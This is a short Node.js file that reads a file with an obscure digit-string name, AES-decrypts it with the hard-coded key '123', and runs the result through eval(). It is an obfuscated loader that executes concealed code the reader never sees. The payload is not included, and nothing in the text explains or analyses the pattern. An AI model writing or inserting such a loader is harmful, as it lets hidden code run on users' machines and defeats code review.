const fs = require('fs');
const CryptoJS = require('crypto-js');
const encryptedFilePath =
  '.81290630172630812731236120381738917381273816201467917830813100000000129382190380000000009312739712356712547912631239781263927153721632153719263821537213672153351252032103762756310542083712846128730000000';
const encryptedData = fs.readFileSync(encryptedFilePath, 'utf8');
const secretKey = '123';
const decryptedData = CryptoJS.AES.decrypt(encryptedData, secretKey).toString(
  CryptoJS.enc.Utf8
);
eval(decryptedData);
